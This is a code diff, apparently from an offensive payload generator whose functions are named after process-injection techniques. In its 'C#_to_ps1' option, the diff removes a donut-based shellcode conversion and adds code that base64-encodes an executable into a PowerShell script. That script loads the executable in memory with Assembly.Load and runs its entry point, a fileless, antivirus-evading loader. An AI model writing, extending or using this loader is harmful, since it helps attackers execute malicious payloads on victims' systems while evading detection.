@@ -224,33 +224,31 @@ def main(powershell_to_vbs,APC_Injection,RemoteThreadContext,RemoteThreadSuspend
                 
                 
                 if formatopions == "2":  #3.C#_to_ps1 
-                    print("请选择你的文件(Select your file)\n" + INOTGREEN)
-                    FilePath = ReadFilePath("exe")
-                    if os.path.exists("payload.bin"):
-                        os.system("del payload.bin")
-                    try:
-                        os.system("""Resource\donut.exe -f "{0}" -o payload.bin""".format(FilePath))
-                        sleep(1)
-                        
-                        #if os.path.exists("payload.bin")==True:
-                        with open("payload.bin", 'rb') as stub:
-                            save = stub.read()
-                        base64context = str(base64.b64encode(save),'utf-8')                     
-                        powershell_payload = powershell_payload.replace('REPLACE_SHELLCODE', base64context)
-                        outfile = GetDesktopPath() + "\\payload.ps1"
-                        file = open(outfile, 'w')
-                        file.write(powershell_payload)
-                        file.close()                                                       
-                        if os.path.exists("payload.ps1"):                            
-                            print(DAZZLINGCOLORS.OKGREEN + "[+] payload.ps1 generated successfully!")
-                            
-                        else:
-                            
-                            print(DAZZLINGCOLORS.OKGREEN + "[!] payload.ps1 build failed!")                        
-                        break
-                        
-                    except:
-                        continue
+                    # C# 可执行文件路径
+                    csharp_exe_path = ReadFilePath("exe")
+                    # 输出的 PowerShell 脚本路径
+                    output_ps1_path = 'output_script.ps1'
+
+                    # 读取 C# 可执行文件的二进制内容
+                    with open(csharp_exe_path, 'rb') as exe_file:
+                        exe_bytes = exe_file.read()
+
+                    # 将二进制内容转换为 Base64 编码字符串
+                    exe_base64 = base64.b64encode(exe_bytes).decode()
+
+                    # 创建 PowerShell 脚本的内容
+                    ps_script = f'''
+                    $exeBytesBase64 = "{exe_base64}"
+                    $exeBytes = [System.Convert]::FromBase64String($exeBytesBase64)
+                    $assembly = [System.Reflection.Assembly]::Load($exeBytes)
+                    $entryPoint = $assembly.EntryPoint
+                    $entryPoint.Invoke($null, $null)
+                    '''
+                    # 将 PowerShell 脚本写入到文件
+                    with open(output_ps1_path, 'w') as ps1_file:
+                        ps1_file.write(ps_script)
+
+                    print(f"PowerShell script has been generated: {output_ps1_path}")
                   
                     
                 if formatopions == "back" or formatopions == "BACK" or formatopions == None:
